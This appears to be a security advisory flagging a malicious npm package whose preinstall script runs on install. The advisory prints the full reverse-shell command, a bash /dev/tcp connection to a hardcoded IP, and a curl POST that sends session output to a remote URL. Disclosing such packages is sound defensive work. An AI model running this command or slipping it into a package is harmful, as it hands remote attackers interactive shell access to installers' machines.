summary: preinstall script opens reverse shell to hardcoded IP on npm install
details: package.json declares a preinstall lifecycle script that runs `bash -i >& /dev/tcp/147.93.157.202/8080 0>&1` to open an interactive reverse shell to 147.93.157.202 on TCP 8080, and pipes session output via `curl -X POST --data-binary @-` to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php. Both actions fire automatically on `npm install` before any package code is inspected, granting the remote party interactive shell access on the installer's machine and an out-of-band beacon over plain HTTP. The package ships no native build sources or legitimate functionality consistent with this behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
